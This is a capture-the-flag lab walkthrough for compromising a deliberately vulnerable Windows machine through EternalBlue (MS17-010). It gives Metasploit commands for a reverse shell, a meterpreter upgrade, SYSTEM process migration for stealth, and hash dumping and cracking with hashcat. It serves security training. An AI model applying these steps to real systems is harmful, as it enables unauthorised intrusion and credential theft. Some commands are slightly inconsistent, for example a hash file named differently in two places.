# Blue

## Introduction
"Deploy & hack into a Windows machine, leveraging common misconfigurations issues."

## Objective
Exploit the critical flaws of Server Message Block version 1 using EternalBlue.

## Tasks
1. Reconnaissance
    - scanning and enumeration
    - look for the machine's vulnerability
2. Gain Access
    - exploit the vulnerability via metasploit
3. Escalate
    - convert a shell to a meterpreter shell, gain escalated privileges, and stabilize the session
4. Cracking
    - dump pass hashes and crack the non-default user's hash 
5. Find flags!
    - navigate inside the filesystem and locate critical directories

## Walkthrough
- Start the prvoided lab machine.
- To attack the machine, you can use the provided attacker machine or use a local/virtual machine via vpn.

---

### Reconnaissance
Command: `nmap -sV -vv --script=vuln [target IP]`

Determine how many ports under 1000 are open and what is the machine vulnerable to (ex: ms08-067).

### Gain access
1. Open Metasploit, a powerful tool for ethical hacking.
    - Command: `msfconsole`
2. Look for the exploitation code that you will run against the machine.
    - Command: `search [ms??-???]` 
    - Look for the full path of code.
    - Hint: `eternalblue`
3. Use the exploitation code.
    - Command: `use exploit/path/of/the/code`
4. Show required values.
    - Command: `show options`
    - The fields with `Yes` are required values, in this case, `RHOSTS` and `LHOST`
5. Set the required values.
    - Command: `set [value] [IP]`
    - `RHOSTS` - the target machine
    - `LHOST` - the attacker machine
    - For the sake of learning how to upgrade shell to a meterpreter shell, downgrade the meterpreter into a shell using the following command.
    - Command: `set payload windows/x64/shell/reverse_tcp`
6. Run the exploit.
    - Command: `run` or `exploit`

### Escalate
1. Put the session in the background and look for the session number.
	- Press `Ctrl` + `z` to put the session in the background.
	- Command: `sessions -l` to show the sessions
2. Command: `use post/multi/manage/shell_to_meterpreter`
3. Show required values and set the session.
	- Command: `show options` to show the required values.
	- Command: `set SESSION [session number]` to upgrade that specific session.
4. Run the code.
	- Command: `run` or `exploit`
5. Look for the upgraded session.
	- Command: `sessions -l`
	- Look for the session with NT AUTHORITY\SYSTEM, an account with the highest privileges in a Windows environment.
6. Use the upgraded session.
	- Command: `sessions -i [session number]`
7. Migrate to a process to stabilize the session.
	- Command: `ps` - shows a snapshot of active processes
	- Look for a process with the SYSTEM privilege, winlogon for example. Look for its PID at the leftmost column and remember it.
	- Command: `migrate [PID]`
	- Try and try and change process until you succeed.

### Cracking
1. Dump the machine's password hashes.
	- Command: `hashdump`
 2. Copy the user `Jon`'s hash (the 32 character string after the third colon) and save it to a text file.
	- Highlight the hash using your mouse.
 	- Press `Ctrl` + `Shift` + `c` to copy it.
  	- Command: `nano hash.txt` to create a text file for the hash
    - Press `Ctrl` + `Shift` + `v` to paste the hash.
    - Press `Ctrl` + `Shift` + `O` to save the file and `Ctrl` +  `Shift` + `x` to exit the editor.
3. Crack the hash using `hashcat`, a password recovery tool
	- Command: `hashcat -m 1000 hashcat.txt /usr/share/wordlists/rockyou.txt`
 		- `-m 1000` - the hash mode is NTLM, a standard password hashing protocol for Windows environments
   		- `hashcat.txt` - the text file with `Jon`'s password hash
   		- `/usr/share/wordlists/rockyou.txt` - a massive list of weak passwords
  
### Find Flags!
Hints:
1. The first flag can be found at the system root. 
2. The second flag can be found at the location where passwords are stored within Windows.
3. The third flag can be found in an excellent location to loot.

Actual Locations:
1. `c:\`
2. `c:\Windows\system32\config`
3. `c:\Users\Jon\Documents`

Opening the text files:
- Using the meterpreter, you can use `cat` to display the flags inside the text files.
- Exanple: `cat c:\\flag.txt`
- Double the backward slash for it to work.

---

## Technicalities
- EternalBlue
	- a computer exploit that is developed and kept secret by National Security Agency (NSA)
	- targets the buffer overflow flaw in SMBv1
	- was leaked by the group Shadow Brokers and used for the WannaCry ransomware in 2017
- SMBv1 - Server Message Block version 1, is a legacy file-sharing protocol of Windows
- MS17-010 - a Windows security designation for SMBv1 vulnerability and its patch
- `nmap -sV -vv --script=vuln [target IP]`
	- `nmap` - a powerful tool for scanning and enumeration
	- `sV` - service/version scan
	- `vv` - show the process line by line
	- `--script=vuln` - find the machine's vulnerability
	- This command will show the target machine's listening ports/services, their versions, and vulnerabilities while showing the real-time process by line.
 - Shell - a tool that executes commands
 - Meterpreter
	- a shell that has pre built commands that are combinations of multiple commands at once
 	- runs in memory and behind a process
- Old Antivirus
	- checks files in the system for scanning
 	- can't detect a meterpreter as it doesn't have a file on its own
- Process Migration
	- for stability, privilege inheritance, and stealth
 		- Stability: The Meterpreter won't crash if the previously exploited process crashes or stops.
  		- Privilege Inheritance: The Meterpreter gains the privileges of the process it migrated into.
  		- Stealth: The process may avoid Meterpreter detection.
    - will fail if the process runs on different bit or on higher privilege
